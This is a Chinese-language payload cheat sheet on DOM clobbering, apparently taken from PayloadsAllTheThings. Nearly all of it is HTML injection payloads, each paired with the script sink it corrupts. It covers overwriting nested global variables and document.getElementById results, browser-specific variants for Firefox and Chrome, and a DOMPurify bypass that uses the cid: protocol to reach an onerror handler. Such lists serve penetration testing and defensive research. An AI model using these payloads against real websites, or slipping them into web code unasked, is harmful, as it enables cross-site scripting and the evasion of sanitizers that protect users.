# DOM Clobbering - DOM覆盖

[SEARCH_KEYWORDS]
漏洞类型: DOM Clobbering DOM覆盖 DOM劫持
攻击类型: XSS Bypass Filter Evasion Variable Overwrite
关键词: DOM clobber id name attribute global variable overwrite
技术: HTML Injection ID Attribute Name Attribute DOM Collection
元素: form a input iframe output base

[CONTENT]

## DOM覆盖概述

DOM Clobbering是一种技术，通过使用特定ID或名称命名HTML元素来覆盖或"篡改"全局变量。这可能导致脚本意外行为和安全漏洞。

## 利用前提

需要页面中存在某种`HTML注入`。

## 基础Payload

### 覆盖 x.y.value

```html
// Payload
<form id=x><output id=y>I've been clobbered</output>

// Sink
<script>alert(x.y.value);</script>
```

### 使用ID和name属性覆盖 x.y

```html
// Payload
<a id=x><a id=x name=y href="Clobbered">

// Sink
<script>alert(x.y)</script>
```

### 覆盖 x.y.z (3层深度)

```html
// Payload
<form id=x name=y><input id=z></form>
<form id=x></form>

// Sink
<script>alert(x.y.z)</script>
```

### 覆盖 a.b.c.d (超过3层)

```html
// Payload
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//portswigger.net';</style>

// Sink
<script>alert(a.b.c.d)</script>
```

### 覆盖 forEach (仅Chrome)

```html
// Payload
<form id=x>
<input id=y name=z>
<input id=y>
</form>

// Sink
<script>x.y.forEach(element=>alert(element))</script>
```

### 覆盖 document.getElementById()

```html
// Payloads
<html id="cdnDomain">clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>

// Sink
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbered
</script>
```

### 覆盖 x.username

```html
// Payload
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

// Sink
<script>
alert(x.username)//Clobbered-username
alert(x.password)//Clobbered-password
</script>
```

## 浏览器特定Payload

### Firefox专用

```html
// Payload
<base href=a:abc><a id=x href="Firefox<>">

// Sink
<script>alert(x)//Firefox<></script>
```

### Chrome专用

```html
// Payload
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

// Sink
<script>alert(x.xyz)//a://Clobbered<></script>
```

## 绕过技巧

### 绕过DomPurify

DomPurify允许`cid:`协议，不编码双引号：

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

## 工具

- DOMClobbering - DOM覆盖Payload列表
- Dom-Explorer - HTML解析器测试工具
- Dom-Explorer Live - 发现变异XSS漏洞

## 参考文档

原始来源: PayloadsAllTheThings/DOM Clobbering/README.md